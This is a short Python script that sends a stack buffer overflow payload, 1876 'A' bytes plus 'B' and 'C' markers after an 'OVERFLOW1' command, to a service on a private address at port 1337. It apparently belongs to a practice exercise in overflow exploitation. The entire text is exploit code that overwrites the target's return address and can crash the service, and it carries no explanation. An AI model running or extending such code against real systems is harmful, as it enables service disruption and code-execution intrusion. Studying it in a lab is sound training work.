#!/usr/bin/python
import socket

buffer = "A" * 1876 + "B" * 4 + "C" * 32

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.10.10',1337))
print("Sending: %s" % str(buffer))
s.send(("OVERFLOW1 " + buffer))
s.close()
